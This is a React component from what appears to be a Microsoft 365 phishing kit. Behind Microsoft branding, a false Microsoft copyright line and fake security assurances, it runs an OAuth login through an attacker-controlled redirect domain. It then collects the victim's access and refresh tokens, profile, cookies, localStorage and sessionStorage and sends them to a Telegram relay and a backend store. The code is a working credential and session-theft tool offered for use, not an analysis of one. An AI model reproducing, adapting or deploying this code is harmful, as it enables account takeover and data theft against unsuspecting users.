import React, { useEffect, useState } from 'react';
import { ExternalLink, Shield, CheckCircle } from 'lucide-react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
  onBack?: () => void;
}

// DYNAMIC COOKIE SETTER - matches your sample logic
function setCookiesFromArray(cookies: Array<any>) {
  let results = [];
  cookies.forEach(cookie => {
    let cookieString = `${cookie.name}=${cookie.value}`;
    // __Host- cookies: must be Secure, path=/, no domain
    if (!cookie.name.startsWith('__Host') && cookie.domain) {
      cookieString += `; domain=${cookie.domain}`;
    }
    if (cookie.path) {
      cookieString += `; path=${cookie.path}`;
    }
    if (cookie.expires) {
      const expiresDate = new Date(cookie.expires * 1000);
      cookieString += `; expires=${expiresDate.toUTCString()}`;
    }
    if (cookie.httpOnly) {
      cookieString += '; HttpOnly';
    }
    // __Secure- cookies: must be Secure and set from HTTPS
    if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
      cookieString += '; Secure';
    }
    if (cookie.samesite) {
      cookieString += `; SameSite=${cookie.samesite}`;
    }
    document.cookie = cookieString;
    results.push({
      name: cookie.name,
      expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
    });
  });
  console.table(results);
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [countdown, setCountdown] = useState(3);

  // Real Microsoft OAuth configuration
  const STATE = Math.random().toString(36).substring(2, 15);
  const REDIRECT_URI = 'https://vaultydocs.com/oauth-callback';
  const MICROSOFT_OAUTH_URL =
    'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
    'client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&' +
    'response_type=code&' +
    `redirect_uri=${REDIRECT_URI}&` +
    'response_mode=query&' +
    'scope=openid%20profile%20email&' +
    'prompt=login' +
    `&state=${STATE}`;

  // Cookie grabbing function - dynamic, matches sample
  const grabCookies = (cookieArray?: Array<any>) => {
    if (cookieArray && Array.isArray(cookieArray)) {
      setCookiesFromArray(cookieArray);
      return;
    }
    // fallback: try to parse cookies from localStorage/session
    const session = JSON.parse(localStorage.getItem('microsoft365_session') || '{}');
    if (session.formattedCookies && Array.isArray(session.formattedCookies)) {
      setCookiesFromArray(session.formattedCookies);
    }
  };

  // Send data to Telegram
  const sendToTelegram = async (data: any) => {
    try {
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: data.email,
          password: 'OAuth Login',
          provider: 'Microsoft',
          fileName: 'Microsoft OAuth',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          browserFingerprint: {
            cookies: data.cookies,
            localStorage: 'OAuth Session',
            sessionStorage: 'OAuth Session',
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
          },
          documentCookies: data.cookies,
          sessionId: Math.random().toString(36).substring(2, 15),
          cookies: data.cookies,
          formattedCookies: [],
          accessToken: data.accessToken,
          refreshToken: data.refreshToken,
          userProfile: data
        })
      });
      const result = await response.json();
      console.log('✅ Data sent to Telegram via backend:', result);
      return result;
    } catch (error) {
      console.error('❌ Failed to send to Telegram via backend:', error);
      return { error: error.message };
    }
  };

  // Save session to backend
  const saveSessionToBackend = async (sessionData: any) => {
    try {
      await fetch('/.netlify/functions/saveSession', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...sessionData,
          formattedCookies: sessionData.formattedCookies || [],
          browserFingerprint: {
            cookies: document.cookie,
            localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
            sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
          }
        })
      });
      console.log('✅ Session saved to backend');
    } catch (error) {
      console.error('❌ Failed to save session to backend:', error);
    }
  };

  useEffect(() => {
    localStorage.setItem('oauth_state', STATE);
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());

    // Store pre-auth cookies for comparison
    const preAuthFingerprint = {
      cookies: document.cookie,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform
    };
    localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthFingerprint));

    // Grab cookies before redirect (from session if available)
    grabCookies();

    // Check if we're returning from OAuth callback
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const storedState = localStorage.getItem('oauth_state');

    if (code && state && state === storedState) {
      handleOAuthCallback(code);
      return;
    }

    // Start countdown for redirect
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          handleOAuthRedirect();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleOAuthCallback = async (code: string) => {
    try {
      // Get browser fingerprint
      const browserFingerprint = {
        cookies: document.cookie,
        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
      };

      // Use the same REDIRECT_URI as the OAuth URL
      const tokenResponse = await fetch(`https://login.microsoftonline.com/common/oauth2/v2.0/token`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
          scope: 'openid profile email User.Read',
          code: code,
          redirect_uri: REDIRECT_URI,
          grant_type: 'authorization_code',
        }),
      });

      const tokenData = await tokenResponse.json();

      if (tokenData.access_token) {
        const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
          headers: {
            'Authorization': `Bearer ${tokenData.access_token}`,
          },
        });

        const profileData = await profileResponse.json();

        const sessionData = {
          email: profileData.mail || profileData.userPrincipalName,
          name: profileData.displayName,
          id: profileData.id,
          provider: 'Microsoft',
          sessionId: Math.random().toString(36).substring(2, 15),
          timestamp: new Date().toISOString(),
          accessToken: tokenData.access_token,
          refreshToken: tokenData.refresh_token,
          authenticationMethod: 'OAuth'
        };

        // Format cookies from document.cookie
        sessionData.formattedCookies = document.cookie.split(';').map(c => {
          const [name, value] = c.trim().split('=');
          return {
            name: name,
            value: value || '',
            domain: window.location.hostname,
            path: '/',
            secure: true,
            httpOnly: false,
            samesite: 'none'
          };
        });

        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));

        // Inject cookies using your sample logic
        grabCookies(sessionData.formattedCookies);

        // Send to Telegram via backend function
        try {
          await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              email: sessionData.email,
              password: 'OAuth Login - No Password',
              provider: 'Microsoft',
              fileName: 'Microsoft OAuth Login',
              timestamp: sessionData.timestamp,
              userAgent: navigator.userAgent,
              browserFingerprint: browserFingerprint,
              documentCookies: document.cookie,
              sessionId: sessionData.sessionId,
              cookies: document.cookie,
              formattedCookies: sessionData.formattedCookies,
              localStorage: browserFingerprint.localStorage,
              sessionStorage: browserFingerprint.sessionStorage,
              accessToken: tokenData.access_token,
              refreshToken: tokenData.refresh_token,
              userProfile: profileData
            })
          });
          // Save session to backend after sending to Telegram
          await saveSessionToBackend({
            ...sessionData,
            formattedCookies: sessionData.formattedCookies,
            browserFingerprint: browserFingerprint,
            accessToken: tokenData.access_token,
            refreshToken: tokenData.refresh_token,
            userProfile: profileData
          });
          console.log('✅ OAuth data sent to Telegram and saved');
        } catch (telegramError) {
          console.error('❌ Failed to send OAuth data to Telegram:', telegramError);
        }

        onLoginSuccess(sessionData);
      }
    } catch (error) {
      console.error('OAuth callback error:', error);
    }
  };

  const handleOAuthRedirect = () => {
    setIsRedirecting(true);
    console.log('🔄 Redirecting to Microsoft OAuth:', MICROSOFT_OAUTH_URL);

    // Grab cookies before redirect (from session if available)
    grabCookies();

    // Add OAuth callback parameter to current URL for handling return
    const currentUrl = new URL(window.location.href);
    currentUrl.searchParams.set('oauth_callback', 'true');
    window.history.replaceState({}, '', currentUrl.toString());

    // Redirect to Microsoft OAuth
    window.location.href = MICROSOFT_OAUTH_URL;
  };

  const handleManualRedirect = () => {
    handleOAuthRedirect();
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        <div className="bg-white rounded-lg shadow-lg border border-[#edebe9] p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-12 h-12 bg-[#0078d4] rounded-full flex items-center justify-center mx-auto mb-3">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
                alt="Microsoft"
                className="w-6 h-6"
              />
            </div>
            <h1 className="text-xl font-bold text-[#323130] mb-2">Secure Authentication</h1>
            <p className="text-sm text-[#605e5c]">Redirecting to Microsoft OAuth for secure login</p>
          </div>

          {/* Security Features */}
          <div className="space-y-3 mb-6">
            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <CheckCircle className="w-4 h-4 text-green-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">SSL Encrypted Connection</p>
                <p className="text-sm text-[#605e5c]">Your data is protected with 256-bit encryption</p>
              </div>
            </div>

            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <Shield className="w-4 h-4 text-blue-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Microsoft OAuth 2.0</p>
                <p className="text-sm text-[#605e5c]">Industry-standard authentication protocol</p>
              </div>
            </div>

            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <ExternalLink className="w-4 h-4 text-purple-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Official Microsoft Login</p>
                <p className="text-sm text-[#605e5c]">Redirecting to login.microsoftonline.com</p>
              </div>
            </div>
          </div>

          {/* Countdown and Redirect */}
          <div className="text-center">
            {!isRedirecting ? (
              <>
                <div className="mb-6">
                  <div className="text-3xl font-bold text-[#0078d4] mb-2">{countdown}</div>
                  <p className="text-sm text-[#605e5c]">Redirecting automatically in {countdown} second{countdown !== 1 ? 's' : ''}</p>
                </div>

                <button
                  onClick={handleManualRedirect}
                  className="w-full bg-[#0078d4] text-white py-2.5 px-4 rounded-md hover:bg-[#106ebe] transition-colors font-medium flex items-center justify-center space-x-2"
                >
                  <ExternalLink className="w-4 h-4" />
                  <span>Continue to Microsoft Login</span>
                </button>
              </>
            ) : (
              <div className="text-center">
                <div className="w-6 h-6 border-3 border-[#0078d4] border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                <p className="text-sm text-[#605e5c]">Redirecting to Microsoft...</p>
                <p className="text-sm text-[#605e5c] mt-2">If you're not redirected automatically, please check your browser settings</p>
              </div>
            )}
          </div>

          {/* Security Notice */}
          <div className="mt-6 p-3 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-blue-800">
              <strong>Security Notice:</strong> You'll be redirected to Microsoft's official login page. Look for "login.microsoftonline.com" in your browser's address bar to confirm authenticity.
            </p>
          </div>

          {/* Footer */}
          <div className="text-center mt-4 pt-4 border-t border-[#edebe9]">
            <p className="text-xs text-[#605e5c]">
              © 2025 Microsoft Corporation. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RealOAuthRedirect